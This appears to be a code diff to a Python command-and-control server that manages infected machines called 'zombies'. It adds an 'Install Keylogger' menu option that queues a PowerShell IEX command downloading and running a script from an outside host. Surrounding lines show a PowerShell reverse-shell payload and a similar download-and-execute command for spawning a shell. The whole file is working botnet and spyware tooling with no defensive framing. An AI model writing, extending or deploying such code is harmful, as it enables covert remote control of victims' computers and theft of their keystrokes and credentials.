@@ -49,6 +49,15 @@ def spawn_shell(socket):
 	#z.command_cue.append("$client = New-Object System.Net.Sockets.TCPClient(\\\""+external_ip+"\\\","+port+");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \\\"PS \\\" + (pwd).Path + \\\"> \\\";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
 	z.command_cue.append("IEX(New-Object Net.WebClient).downloadString((\\\"https://220.ip-54-37-16.eu/rev.txt\\\"))")
 	# IEX(New-Object Net.WebClient).downloadString('http://10.10.14.12/PowerUp.ps1')
+
+def install_keylogger(socket):
+	socket.send(b'Please choose a zombie to install keylogger by specifying his id: ')
+	choice = int(socket.recv(2048).decode('utf-8'))
+	z = listener.zombies[choice]
+	socket.send(('Zombie with uuid: '+z.uuid+' is selected.\n').encode())
+	socket.send(b'\nResults of the keylogger can be found on the zombie machine in %TEMP%\\keylogger.txt\n')
+	z.command_cue.append("IEX(New-Object Net.WebClient).downloadString((\\\"https://220.ip-54-37-16.eu/key.txt\\\"))")
+
 def empty_zombie_list(socket):
 	listener.zombies = []
 	list_zombies(socket)
@@ -64,7 +73,8 @@ def print_menu(socket):
 
 0) List zombies
 1) Execute command
-2) Spawn shell
+2) Spawn shell (Does not work in Constrained Language Mode, blocks zombie probes temporarily)
+3) Install Keylogger (Does not work in Constrained Language Mode)
 
 88) Empty zombie list
 
@@ -106,6 +116,8 @@ class ClientThread(threading.Thread):
 				execute_command(self.clientsocket)
 			elif choice == 2:
 				spawn_shell(self.clientsocket)
+			elif choice == 3:
+				install_keylogger(self.clientsocket)
 			elif choice == 88:
 				empty_zombie_list(self.clientsocket)
 			# Close socket
